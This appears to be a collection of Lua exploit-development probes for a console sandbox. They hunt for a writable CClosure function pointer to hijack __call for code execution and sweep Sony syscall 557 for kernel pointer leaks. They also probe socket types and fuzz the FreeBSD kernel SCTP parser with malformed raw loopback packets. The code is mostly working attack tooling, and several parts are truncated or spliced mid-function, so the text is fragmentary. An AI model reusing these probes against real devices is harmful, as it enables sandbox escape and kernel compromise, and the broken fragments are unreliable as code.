local call_str = tostring(call_fn)
print("__call: " .. call_str)

-- Extract C function pointer from CClosure
local fn_hex = call_str:match("0x([0-9a-fA-F]+)")
if fn_hex then
    local fn_obj = uint64("0x" .. fn_hex)
    print("CClosure object: 0x" .. fn_hex)

    -- Read structure to find C function pointer
    print("CClosure memory dump:")
    for off = 0, 80, 8 do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local note = ""
            local mod, sect, moff = find_module(h, l)
            if mod then
                note = string.format(" → mod%d.%s+0x%X", mod, sect, moff)
            end
            print(string.format("  +%02d: %s%s", off, fmt_addr(val), note))
        else
            print(string.format("  +%02d: UNREADABLE", off))
        end
    end

    -- The C function pointer is likely at offset 32 (standard Lua 5.1 CClosure)
    -- Try each candidate and cross-reference with modules
    print("")
    print("C function pointer candidates:")
    for _, off in ipairs({16, 24, 32, 40, 48, 56}) do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local mod, sect, moff = find_module(h, l)
            if mod then
                print(string.format("  +%02d: %s → MODULE %d %s+0x%X  *** LIKELY ***",
                    off, fmt_addr(val), mod, sect, moff))
            else
                -- Check if it's in eboot's RX range (readable)
                if h == 0 and l >= 0x08000000 and l < 0x10000000 then
                    print(string.format("  +%02d: %s (possible code in low range)", off, fmt_addr(val)))
                elseif h >= 3 and h <= 4 then
                    print(string.format("  +%02d: %s (heap/mmap range)", off, fmt_addr(val)))
                end
            end
        end
    end

    -- Try to read code bytes at the C function (if in RX region)
    for _, off in ipairs({32, 40, 24}) do
        local val = safe_rq(fn_obj + off)
        if val then
            local h, l = get_hi_lo(val)
            local mod, sect, moff = find_module(h, l)
            if mod and sect == "text" then
                print("")
                print(string.format("Reading code at +%d (%s) — module %d text+0x%X:",
                    off, fmt_addr(val), mod, moff))
                -- Read 64 bytes of code (hex dump)
                local code_addr = val
                for row = 0, 48, 16 do
                    local hex = ""
                    local readable = true
                    for col = 0, 15 do
                        local ok_b, b = pcall(function()
                            return memory.read_byte(code_addr + row + col)
                        end)
                        if ok_b then
                            hex = hex .. string.format("%02x ", to_num(b))
                        else
                            hex = hex .. "?? "
                            readable = false
                        end
                    end
                    print(string.format("  +%03x: %s", row, hex))
                    if not readable then
                        print("  *** HIT XO BOUNDARY — stopping read ***")
                        break
                    end
                end
                break
            end
        end
    end
end
print("")

print("=== B: METATABLE ENTRIES DEEP DIVE ===")
-- Investigate arg_addr, chain, create_initial_chain, new
for _, key in ipairs({"arg_addr", "chain", "create_initial_chain", "new", "__index"}) do
    local ok_v, val = pcall(function() return mt[key] end)
    if ok_v and val ~= nil then
        local vtype = type(val)
        print(string.format("  mt.%s [%s]:", key, vtype))
        if vtype == "function" then
            print("    " .. tostring(val))
            -- Try to get address from tostring
            local fh = tostring(val):match("0x([0-9a-fA-F]+)")
            if fh then
                local faddr = uint64("0x" .. fh)
                -- Read first qword to see if it looks like a function object
                local fv = safe_rq(faddr + 32)
                if fv then
                    local vh, vl = get_hi_lo(fv)
                    local mod, sect, moff = find_module(vh, vl)
                    if mod then
                        print(string.format("    C func ptr: %s → mod%d.%s+0x%X",
                            fmt_addr(fv), mod, sect, moff))
                    else
                        print("    C func ptr candidate: " .. fmt_addr(fv))
                    end
                end
            end
        elseif vtype == "number" then
            print(string.format("    value: %d (0x%X)", val, val))
        elseif vtype == "string" then
            print("    value: '" .. val:sub(1, 60) .. "'")
        elseif vtype == "table" then
            print("    table contents:")
            local count = 0
            for k2, v2 in pairs(val) do
                count = count + 1
                if count <= 10 then
                    print("      " .. tostring(k2) .. " = " .. tostring(v2):sub(1, 50))
                end
            end
            print("    entries: " .. count)
        elseif vtype == "userdata" then
            print("    " .. tostring(val):sub(1, 80))
        end
    else
        print("  mt." .. key .. ": nil or inaccessible")
    end
end

print("=== C: WRITABLE FUNCTION POINTERS SCAN ===")
-- Scan the neighborhood of __call for writable function pointers
-- The dispatch function might read a function pointer from writable memory
if fn_hex then
    local fn_obj = uint64("0x" .. fn_hex)

    -- Check if the CClosure itself is writable
    local saved = safe_rq(fn_obj + 32)
    if saved then
        local wrote = safe_wq(fn_obj + 32, uint64("0xDEADDEADDEADDEAD"))
        local rb = safe_rq(fn_obj + 32)
        safe_wq(fn_obj + 32, saved) -- restore immediately
        local h, l = get_hi_lo(rb)
        local is_writable = (h == 0xDEADDEAD)
        print("  CClosure+32 writable: " .. tostring(is_writable))
        if is_writable then
            print("  *** CClosure C function pointer is WRITABLE! ***")
            print("  *** We could redirect __call to arbitrary code! ***")
        end
    end

    -- Also check arg_addr if it's a pointer
    local ok_aa, arg_addr_val = pcall(function() return mt.arg_addr end)
    if ok_aa and arg_addr_val ~= nil then
        if type(arg_addr_val) == "number" or
           (type(arg_addr_val) == "table" and arg_addr_val.h) then
            local aah, aal = get_hi_lo(arg_addr_val)
            print("  arg_addr value: " .. fmt_addr(arg_addr_val))
            if aah >= 3 and aah <= 4 then
                -- Heap range — scan for function pointers
                local base = arg_addr_val
                print("  arg_addr neighborhood (heap range):")
                for off = -32, 128, 8 do
                    local v = safe_rq(base + off)
                    if v then
                        local vh, vl = get_hi_lo(v)
                        local mod, sect, moff = find_module(vh, vl)
                        local note = ""
                        if mod then
                            note = string.format(" → mod%d.%s+0x%X", mod, sect, moff)
                        end
                        print(string.format("    %+04d: %s%s", off, fmt_addr(v), note))
                    end
                end
            end
        end
    end
end
print("")

print("=== D: SONY SYSCALL 557 VERSION SWEEP ===")
local sc557 = make_syscall(557)
local st = memory.alloc(0x400)

-- Sweep version field 0-255 with size=0x200
print("  version sweep (size=0x200):")
local version_results = {}
for ver = 0, 255 do
    for i = 0, 0x1FF, 4 do safe_wd(st + i, 0) end
    safe_wd(st, ver)
    safe_wd(st + 4, 0x200)
    local ok_v, ret_v = pcall(function() return sc557(uint64(st)) end)
    local r = ok_v and to_num(ret_v) or -999
    if r ~= -1 and r ~= -999 then
        print(string.format("    ver=%d → ret=%d (0x%X)", ver, r, r))
        table.insert(version_results, {ver = ver, ret = r})
    end
end
print("  valid versions found: " .. #version_results)

-- For each valid version, check if buffer gets modified
print("")
print("  buffer modification per version:")
for _, vr in ipairs(version_results) do
    for i = 0, 0x3FF, 4 do safe_wd(st + i, 0xDEADDEAD) end
    safe_wd(st, vr.ver)
    safe_wd(st + 4, 0x200)
    pcall(function() sc557(uint64(st)) end)

    -- Check how much was modified
    local modified_bytes = 0
    for i = 8, 0x1FF, 4 do
        local v = safe_rd(st + i)
        if v and v ~= 0xDEADDEAD then
            modified_bytes = modified_bytes + 4
        end
    end
    if modified_bytes > 0 then
        print(string.format("    ver=%d: %d bytes modified!", vr.ver, modified_bytes))
        -- Dump modified region
        for off = 0, math.min(0xFF, 0x1FF), 8 do
            local v = safe_rq(st + off)
            if v then
                local h, l = get_hi_lo(v)
                local note = ""
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    note = " *** KERNEL PTR ***"
                end
                if fmt_addr(v) ~= "DEADDEAD_DEADDEAD" then
                    print(string.format("      +%03x: %s%s", off, fmt_addr(v), note))
                end
            end
        end
    else
        print(string.format("    ver=%d: no modification", vr.ver))
    end
end

-- Also try: size field variations with working version
if #version_results > 0 then
    local best_ver = version_results[1].ver
    print("")
    print("  size sweep with ver=" .. best_ver .. ":")
    for _, sz in ipairs({0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000}) do
        for i = 0, 0x3FF, 4 do safe_wd(st + i, 0) end
        safe_wd(st, best_ver)
        safe_wd(st + 4, sz)
        local ok_s, ret_s = pcall(function() return sc557(uint64(st)) end)
        print(string.format("    size=0x%X: ret=%s",
            sz, ok_s and tostring(to_num(ret_s)) or "CRASH"))
    end
end
print("")

safe_wd(st, 0x200)

end

for i = 0, 0x3FF, 4 do safe_wd(st + i, 0xDEADDEAD) end
local ok_e2, ret_e2 = pcall(function() return sc557(uint64(0), uint64(st), uint64(0x400)) end)
print("557(0, buf, 0x400): ret=" .. (ok_e2 and to_num(ret_e2) or -999))
local mod_e2 = false
for i = 0, 0xFF, 4 do
    local v = safe_rd(st + i)
    if v and v ~= 0xDEADDEAD then mod_e2 = true; break end
end
if mod_e2 then
    print("  *** BUFFER MODIFIED with (0, buf, size) pattern! ***")
    for off = 0, 0x7F, 8 do
        local v = safe_rq(st + off)
        if v and fmt_addr(v) ~= "DEADDEAD_DEADDEAD" then
            local h, l = get_hi_lo(v)
            local note = ""
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then note = " *** KPTR ***" end
            print(string.format("    +%03x: %s%s", off, fmt_addr(v), note))
        end

end

print("=== F: SOCKETPAIR EXPLOITATION ===")
local SYS_socketpair = 135
local SYS_sendmsg = 28
local SYS_recvmsg = 27
local SYS_close = 6
local SYS_getsockopt = 118
local SYS_setsockopt = 105
local AF_LOCAL = 1
local SOCK_STREAM = 1
local SOL_SOCKET = 0xFFFF

-- Create socketpair
local sc_sp = make_syscall(SYS_socketpair)
local sp_fds = memory.alloc(16)
safe_wd(sp_fds, 0xFFFFFFFF)
safe_wd(sp_fds + 4, 0xFFFFFFFF)
local ok_sp, ret_sp = pcall(function()
    return sc_sp(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0), uint64(sp_fds))
end)
local fd0 = safe_rd(sp_fds)
local fd1 = safe_rd(sp_fds + 4)
print("socketpair: ret=" .. (ok_sp and to_num(ret_sp) or -999) ..
      " fd0=" .. (fd0 or "?") .. " fd1=" .. (fd1 or "?"))

if fd0 and fd0 ~= 0xFFFFFFFF and fd1 and fd1 ~= 0xFFFFFFFF then
    -- Test SCM_RIGHTS — pass an fd through the socketpair
    -- This creates kernel objects (struct file, struct unpcb) that might leak pointers
    local SCM_RIGHTS = 1
    local sc_sendmsg = make_syscall(SYS_sendmsg)
    local sc_recvmsg = make_syscall(SYS_recvmsg)

    -- Build sendmsg with SCM_RIGHTS control message
    -- msghdr: msg_name(8), msg_namelen(4), pad(4), msg_iov(8), msg_iovlen(8),
    --         msg_control(8), msg_controllen(4), pad(4), msg_flags(4)
    local msghdr = memory.alloc(128)
    local iov = memory.alloc(16)
    local data = memory.alloc(8)
    safe_wd(data, 0x41424344) -- "DCBA"

    -- iovec: iov_base(8) + iov_len(8)
    safe_wq(iov, uint64(data))
    safe_wq(iov + 8, uint64(4))

    -- cmsghdr + fd payload
    -- cmsghdr: cmsg_len(4), cmsg_level(4), cmsg_type(4), [data]
    local cmsg = memory.alloc(32)
    safe_wd(cmsg, 16 + 4)    -- cmsg_len = header(16? or 12?) + sizeof(int)
    safe_wd(cmsg + 4, 0)     -- padding
    safe_wd(cmsg + 8, SOL_SOCKET) -- cmsg_level
    safe_wd(cmsg + 12, SCM_RIGHTS) -- cmsg_type
    safe_wd(cmsg + 16, fd0)  -- the fd to pass

    -- Actually on FreeBSD 64-bit, cmsghdr is:
    -- socklen_t cmsg_len (4 bytes)
    -- int cmsg_level (4 bytes)
    -- int cmsg_type (4 bytes)
    -- data follows at offset 12, but CMSG_DATA rounds up
    -- CMSG_LEN(4) = 12 + 4 = 16 for one fd
    safe_wd(cmsg, 16)              -- cmsg_len
    safe_wd(cmsg + 4, SOL_SOCKET)  -- cmsg_level
    safe_wd(cmsg + 8, SCM_RIGHTS)  -- cmsg_type
    safe_wd(cmsg + 12, fd0)        -- the fd

    -- msghdr for send
    for i = 0, 127, 4 do safe_wd(msghdr + i, 0) end
    safe_wq(msghdr + 0, uint64(0))    -- msg_name = NULL
    safe_wd(msghdr + 8, 0)            -- msg_namelen = 0
    safe_wq(msghdr + 16, uint64(iov)) -- msg_iov
    safe_wq(msghdr + 24, uint64(1))   -- msg_iovlen = 1
    safe_wq(msghdr + 32, uint64(cmsg))-- msg_control
    safe_wd(msghdr + 40, 16)          -- msg_controllen = 16

    -- Send on fd0
    local ok_send, ret_send = pcall(function()
        return sc_sendmsg(uint64(fd0), uint64(msghdr), uint64(0))
    end)
    print("sendmsg(SCM_RIGHTS) on fd0: ret=" ..
          (ok_send and to_num(ret_send) or -999))

    -- Receive on fd1
    local recv_cmsg = memory.alloc(64)
    local recv_data = memory.alloc(32)
    local recv_iov = memory.alloc(16)
    safe_wq(recv_iov, uint64(recv_data))
    safe_wq(recv_iov + 8, uint64(32))

    local recv_msghdr = memory.alloc(128)
    for i = 0, 127, 4 do safe_wd(recv_msghdr + i, 0) end
    safe_wq(recv_msghdr + 0, uint64(0))
    safe_wd(recv_msghdr + 8, 0)
    safe_wq(recv_msghdr + 16, uint64(recv_iov))
    safe_wq(recv_msghdr + 24, uint64(1))
    safe_wq(recv_msghdr + 32, uint64(recv_cmsg))
    safe_wd(recv_msghdr + 40, 64)

    local ok_recv, ret_recv = pcall(function()
        return sc_recvmsg(uint64(fd1), uint64(recv_msghdr), uint64(0))
    end)
    print("recvmsg on fd1: ret=" .. (ok_recv and to_num(ret_recv) or -999))

    if ok_recv and to_num(ret_recv) >= 0 then
        -- Check received cmsg
        local rcmsg_len = safe_rd(recv_cmsg)
        local rcmsg_level = safe_rd(recv_cmsg + 4)
        local rcmsg_type = safe_rd(recv_cmsg + 8)
        local rcmsg_fd = safe_rd(recv_cmsg + 12)
        print("  cmsg_len=" .. (rcmsg_len or "?") ..
              " level=" .. (rcmsg_level or "?") ..
              " type=" .. (rcmsg_type or "?") ..
              " fd=" .. (rcmsg_fd or "?"))
        if rcmsg_fd and rcmsg_fd ~= 0 and rcmsg_fd ~= 0xFFFFFFFF then
            print("  *** SCM_RIGHTS works! Received fd " .. rcmsg_fd .. " ***")
        end

        -- Check msg_flags for truncation, etc
        local rflags = safe_rd(recv_msghdr + 44)
        print("  msg_flags: 0x" .. string.format("%X", rflags or 0))

        -- Dump full received cmsg area for any kernel pointers
        print("  recv cmsg dump:")
        for off = 0, 56, 8 do
            local v = safe_rq(recv_cmsg + off)
            if v then
                local h, l = get_hi_lo(v)
                local note = ""
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    note = " *** KERNEL PTR ***"
                end
                print(string.format("    +%02d: %s%s", off, fmt_addr(v), note))
            end
        end
    end

    -- Test SO_PEERCRED — might reveal kernel info
    local sc_getopt = make_syscall(SYS_getsockopt)
    local cred_buf = memory.alloc(64)
    local cred_len = memory.alloc(8)
    for i = 0, 63, 4 do safe_wd(cred_buf + i, 0xDEADDEAD) end
    safe_wd(cred_len, 64)

    local LOCAL_PEERCRED = 0x001 -- FreeBSD LOCAL_PEERCRED
    local ok_cred, ret_cred = pcall(function()
        return sc_getopt(uint64(fd0), uint64(0), uint64(LOCAL_PEERCRED),
            uint64(cred_buf), uint64(cred_len))
    end)
    local cred_sz = safe_rd(cred_len) or 0
    print("")
    print("LOCAL_PEERCRED: ret=" .. (ok_cred and to_num(ret_cred) or -999) ..
          " len=" .. cred_sz)
    if ok_cred and to_num(ret_cred) == 0 then
        for off = 0, math.min(cred_sz - 1, 31), 4 do
            local v = safe_rd(cred_buf + off)
            print(string.format("  +%02d: 0x%08X (%d)", off, v or 0, v or 0))
        end
    end

    -- Cleanup
    pcall(function() make_syscall(SYS_close)(uint64(fd0)) end)
    pcall(function() make_syscall(SYS_close)(uint64(fd1)) end)
end
print("")

print("=== PROBE 47a COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 47b: CClosure Hijack — Writable Function Pointer Test
--
-- Context: Probe 47a's Section C (the critical test) never ran because
-- tostring() on functions returns "function: 3108dbaa0" — no 0x prefix.
-- The pattern match "0x([0-9a-fA-F]+)" failed silently, skipping everything.
--
-- This probe fixes the parsing and focuses exclusively on:
--   A. CClosure struct dump + writable function pointer test
--   B. jmpbuf / recover_from_call overwrite test
--   C. If CClosure+32 is writable: controlled redirect via eboot gadgets
--   D. Metatable function pointers — are ANY of them writable?
--   E. Scan chain/arg_addr for writable code pointers
--
-- If the CClosure C function pointer at +32 is writable, we have a
-- code execution primitive: redirect __call to any address.

print("=== PROBE 47b: CCLOSURE HIJACK ===")
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_addr(val)
    local h, l = get_hi_lo(val)
    return string.format("%08X_%08X", h, l)
end

-- FIXED: parse address from tostring() — handles BOTH "function: 0xABC" and "function: ABC"
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)") or s:match(":%s*([0-9a-fA-F][0-9a-fA-F]+)%s*$")
    if hex then
        return uint64("0x" .. hex), hex
    end
    return nil, nil
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

-- Get module bases for cross-referencing
local sc_info = make_syscall(593)
local modules = {}
for handle = 0, 50 do
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local ok_i, rv_i = pcall(function() return sc_info(uint64(handle), uint64(info)) end)
    if ok_i and to_num(rv_i) == 0 then
        local text_lo = safe_rd(info + 0x108) or 0
        local text_hi = safe_rd(info + 0x10C) or 0
        local text_sz_lo = safe_rd(info + 0x110) or 0
        local text_sz_hi = safe_rd(info + 0x114) or 0
        local data_lo = safe_rd(info + 0x148) or 0
        local data_hi = safe_rd(info + 0x14C) or 0
        local data_sz_lo = safe_rd(info + 0x150) or 0
        local data_sz_hi = safe_rd(info + 0x154) or 0
        if text_hi > 0 or text_lo > 0 then
            table.insert(modules, {
                handle = handle,
                text_hi = text_hi, text_lo = text_lo,
                text_sz_hi = text_sz_hi, text_sz_lo = text_sz_lo,
                data_hi = data_hi, data_lo = data_lo,
                data_sz_hi = data_sz_hi, data_sz_lo = data_sz_lo,
            })
        end
    end
end
print("modules loaded: " .. #modules)

local function find_module(ah, al)
    for _, m in ipairs(modules) do
        local te_h = m.text_hi + m.text_sz_hi
        local te_l = m.text_lo + m.text_sz_lo
        if te_l >= 0x100000000 then te_h = te_h + 1; te_l = te_l - 0x100000000 end
        if (ah > m.text_hi or (ah == m.text_hi and al >= m.text_lo)) and
           (ah < te_h or (ah == te_h and al < te_l)) then
            return m.handle, "text", al - m.text_lo
        end
        if m.data_lo ~= 0 or m.data_hi ~= 0 then
            local de_h = m.data_hi + m.data_sz_hi
            local de_l = m.data_lo + m.data_sz_lo
            if de_l >= 0x100000000 then de_h = de_h + 1; de_l = de_l - 0x100000000 end
            if (ah > m.data_hi or (ah == m.data_hi and al >= m.data_lo)) and
               (ah < de_h or (ah == de_h and al < de_l)) then
                return m.handle, "data", al - m.data_lo
            end
        end
    end
    return nil
end

    -- After redirect, calling any syscall object should just return
    -- without doing the syscall

                return memory.read_byte(eboot_base + i)
            end)

            local ok_test, ret_test = pcall(function() return test_sc() end)

                print("  *** We have arbitrary code execution! ***")

                print("  Redirect caused a crash/exception (may need different gadget)")
            end

    print("Checking if fn_addr redirect would work instead...")

    -- Even though make_syscall bypasses fn_addr, the ORIGINAL syscall.pipe
    -- might still read fn_addr. Test: write a known value to fn_addr, call pipe
    if fn_str then
        local fn_addr = uint64(fn_str)
        local fn_val = safe_rq(fn_addr)
        if fn_val then
            print("fn_addr current value: " .. fmt_addr(fn_val))
            print("Testing fn_addr writability...")
            local saved = fn_val
            safe_wq(fn_addr, uint64(string.format("0x%X%08X", 0xDEADC0DE, 0xDEADC0DE)))
            local rb = safe_rq(fn_addr)
            safe_wq(fn_addr, saved)
            local rb_h = get_hi_lo(rb)
            if rb_h == 0xDEADC0DE then
                print("fn_addr IS writable (but make_syscall doesn't use it)")
                print("Testing if original syscall.pipe.__call reads fn_addr...")
                -- This is dangerous — skip for safety
                print("(skipping live redirect test on syscall.pipe — too risky)")
            else
                print("fn_addr is read-only: " .. fmt_addr(rb))
            end
        end
    end
end
print("")

-- ============================================
-- SECTION G: Summary
-- ============================================
print("=== G: SUMMARY ===")
print("CClosure address: " .. (fn_hex and ("0x" .. fn_hex) or "UNKNOWN"))
print("C func ptr offset: " .. (c_func_offset and ("+" .. c_func_offset) or "NOT FOUND"))
print("C func ptr value: " .. (c_func_ptr and fmt_addr(c_func_ptr) or "UNKNOWN"))
print("C func ptr writable: " .. tostring(write_results[c_func_offset or -1] or false))
print("fn_addr: " .. (fn_str or "UNKNOWN"))
print("Modules found: " .. #modules)
if writable_count > 0 then
    print("")
    print("*** WRITABLE OFFSETS IN CCLOSURE: ***")
    for off, w in pairs(write_results) do
        if w then print("  +" .. off) end
    end
end
print("")
print("=== PROBE 47b COMPLETE ===")
```

```lua
-- PROBE 48a: SCTP, IPv6, ICMP Socket Availability

-- Context: All loader-internal code execution paths are dead (CClosure+0

-- socket types are available — SCTP, IPv6, ICMPv6, DIVERT, raw protocols.

-- SCTP in particular has had many kernel CVEs in FreeBSD.

--   A. SCTP socket creation (multiple types)
--   B. IPv6 socket creation + dual-stack test
--   C. ICMP/ICMPv6 raw socket test
--   D. DIVERT socket test (FreeBSD firewall interception)
--   E. Protocol sweep: try all IP protocols 0-142 as raw sockets
--   F. Socket option enumeration on any working socket

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok

local sc_connect = make_syscall(98)
local sc_sendto = make_syscall(133)

local AF_ROUTE = 17

local SOCK_DGRAM  = 2

local IPPROTO_SCTP = 132
local IPPROTO_ICMP = 1
local IPPROTO_ICMPV6 = 58

    local ok, rv = pcall(function() return sc_socket(uint64(af), uint64(stype), uint64(proto)) end)
    local fd = ok and to_num(rv) or -999
    local status = fd >= 0 and "OPEN fd=" .. fd or "FAILED (" .. fd .. ")"
    print(string.format("  %-40s %s", desc, status))

local sctp_dgram  = try_socket(AF_INET, SOCK_DGRAM, IPPROTO_SCTP, "SCTP/INET dgram")
local sctp_seq    = try_socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP, "SCTP/INET seqpacket")
```

## probes/phase11_network_attacks/48b_sctp_loopback_fuzz.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 48b: SCTP Chunk Parser Fuzzing via Raw Socket Loopback
--
-- Context: Probe 48a confirmed SCTP raw sockets work (SOCK_RAW/proto 132).
-- Even though SCTP stream/seqpacket sockets are blocked by the sandbox,
-- the kernel's SCTP input parser (sctp_input → sctp_common_input_processing)
-- is still registered in the protocol switch table.
--
-- Attack: send crafted SCTP packets with malformed chunks to 127.0.0.1 via
-- raw IP socket with IP_HDRINCL. The kernel routes to loopback, ip_input()
-- dispatches to sctp_input() based on protocol=132, and the chunk parser
-- runs IN KERNEL CONTEXT with no sandbox filtering.
--
-- SCTP has had many FreeBSD CVEs: chunk length bugs, INIT parameter overflow,
-- cookie-echo state confusion, SACK gap block overflows.
--
-- A crash/reboot during this probe = kernel sctp_input() hit.

print("=== PROBE 48b: SCTP LOOPBACK FUZZ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end
local function safe_ww(addr, val)
    local ok = pcall(function() memory.write_word(addr, val) end)
    return ok
end

local pid = syscall.getpid():tonumber()
print("pid: " .. pid)

local sc_socket = make_syscall(97)
local sc_close = make_syscall(6)
local sc_setsockopt = make_syscall(105)
local sc_sendto = make_syscall(133)

-- ============================================
-- SECTION A: Create raw IP socket with IP_HDRINCL
-- ============================================
print("=== A: RAW SOCKET SETUP ===")

local ok_s, rv_s = pcall(function()
    return sc_socket(uint64(2), uint64(3), uint64(255))  -- AF_INET, SOCK_RAW, IPPROTO_RAW
end)
local raw_fd = ok_s and to_num(rv_s) or -1
print("raw socket: fd=" .. raw_fd)

if raw_fd < 0 then
    -- Try IPPROTO_SCTP raw
    ok_s, rv_s = pcall(function()
        return sc_socket(uint64(2), uint64(3), uint64(132))  -- IPPROTO_SCTP
    end)
    raw_fd = ok_s and to_num(rv_s) or -1
    print("SCTP raw socket: fd=" .. raw_fd)
end

if raw_fd < 0 then
    print("=== 48b DONE (no raw socket) ===")
    return
end

-- Enable IP_HDRINCL
local optval = memory.alloc(4)
safe_wd(optval, 1)
local ok_h, rv_h = pcall(function()
    return sc_setsockopt(uint64(raw_fd), uint64(0), uint64(2), uint64(optval), uint64(4))
end)
print("IP_HDRINCL: ret=" .. (ok_h and to_num(rv_h) or -999))

-- Destination: 127.0.0.1 (loopback)
local dst_sa = memory.alloc(16)
for i = 0, 15 do safe_wb(dst_sa + i, 0) end
safe_wb(dst_sa + 0, 16)    -- sin_len
safe_wb(dst_sa + 1, 2)     -- AF_INET
safe_wb(dst_sa + 4, 127)   -- 127.0.0.1
safe_wb(dst_sa + 5, 0)
safe_wb(dst_sa + 6, 0)
safe_wb(dst_sa + 7, 1)
print("")

-- ============================================
-- Helper: build an IP+SCTP packet in memory
-- ============================================
-- IP header (20 bytes) + SCTP data follows
local pkt = memory.alloc(2048)

local function build_ip_header(total_len)
    safe_wb(pkt + 0, 0x45)      -- version=4, ihl=5 (20 bytes)
    safe_wb(pkt + 1, 0)         -- TOS
    safe_wb(pkt + 2, math.floor(total_len / 256))  -- total length high
    safe_wb(pkt + 3, total_len % 256)               -- total length low
    safe_ww(pkt + 4, 0x1234)    -- identification
    safe_ww(pkt + 6, 0)         -- flags + frag offset
    safe_wb(pkt + 8, 64)        -- TTL
    safe_wb(pkt + 9, 132)       -- protocol = SCTP
    safe_ww(pkt + 10, 0)        -- checksum (kernel fills)
    -- src: 127.0.0.1
    safe_wb(pkt + 12, 127); safe_wb(pkt + 13, 0)
    safe_wb(pkt + 14, 0);   safe_wb(pkt + 15, 1)
    -- dst: 127.0.0.1
    safe_wb(pkt + 16, 127); safe_wb(pkt + 17, 0)
    safe_wb(pkt + 18, 0);   safe_wb(pkt + 19, 1)
end

-- SCTP common header: src_port(2) + dst_port(2) + vtag(4) + checksum(4) = 12 bytes
local function build_sctp_header(src_port, dst_port, vtag)
    local base = 20  -- after IP header
    safe_wb(pkt + base + 0, math.floor(src_port / 256))
    safe_wb(pkt + base + 1, src_port % 256)
    safe_wb(pkt + base + 2, math.floor(dst_port / 256))
    safe_wb(pkt + base + 3, dst_port % 256)
    -- vtag (4 bytes, big-endian)
    safe_wb(pkt + base + 4, math.floor(vtag / 0x1000000) % 256)
    safe_wb(pkt + base + 5, math.floor(vtag / 0x10000) % 256)
    safe_wb(pkt + base + 6, math.floor(vtag / 0x100) % 256)
    safe_wb(pkt + base + 7, vtag % 256)
    -- checksum = 0 (we'll see if kernel validates or not)
    safe_wd(pkt + base + 8, 0)
end

-- Write a chunk at offset (relative to SCTP header start at pkt+20)
local function write_chunk(offset, ctype, flags, length, data_bytes)
    local base = 20 + 12 + offset  -- IP(20) + SCTP hdr(12) + offset
    safe_wb(pkt + base + 0, ctype)
    safe_wb(pkt + base + 1, flags)
    safe_wb(pkt + base + 2, math.floor(length / 256))
    safe_wb(pkt + base + 3, length % 256)
    if data_bytes then
        for i = 1, #data_bytes do
            safe_wb(pkt + base + 4 + i - 1, data_bytes:byte(i))
        end
    end
end

-- Fill packet region with a byte
local function fill_pkt(start, len, byte)
    for i = start, start + len - 1 do
        safe_wb(pkt + i, byte)
    end
end

local function send_pkt(total_len, name)
    build_ip_header(total_len)
    local ok_tx, rv_tx = pcall(function()
        return sc_sendto(uint64(raw_fd), uint64(pkt), uint64(total_len),
            uint64(0), uint64(dst_sa), uint64(16))
    end)
    local ret = ok_tx and to_num(rv_tx) or -999
    print(string.format("  %-35s len=%d ret=%d", name, total_len, ret))
    return ret
end

-- ============================================
-- SECTION B: SCTP chunk parser attacks
-- ============================================
print("=== B: SCTP CHUNK PARSER ATTACKS ===")
print("Sending to 127.0.0.1 via raw socket + IP_HDRINCL")
print("Each variant targets sctp_input() chunk processing")

local variant = 0

    variant = variant + 1
    return variant

-- B1: INIT chunk (type=1) — most complex parser path

print("--- INIT variants ---")

safe_wd(pkt + init_base + 12, 0x01000000)  -- initial TSN
send_pkt(20 + 12 + 20, "B" .. next_var() .. ": INIT minimal")

safe_wd(pkt + init_base + 4, 0xFFFF0000)
safe_ww(pkt + init_base + 8, 0x0100)
safe_ww(pkt + init_base + 10, 0x0100)
safe_wd(pkt + init_base + 12, 0x01000000)

-- 50 minimal chunks (chunk storm)

end

for _, ctype in ipairs({128, 191, 192, 254, 255, 62, 63, 64, 127}) do

print("")

-- B38+: FORWARD_TSN (type=192) — often poorly validated
print("--- FORWARD_TSN variants ---")

-- Forward TSN with no streams
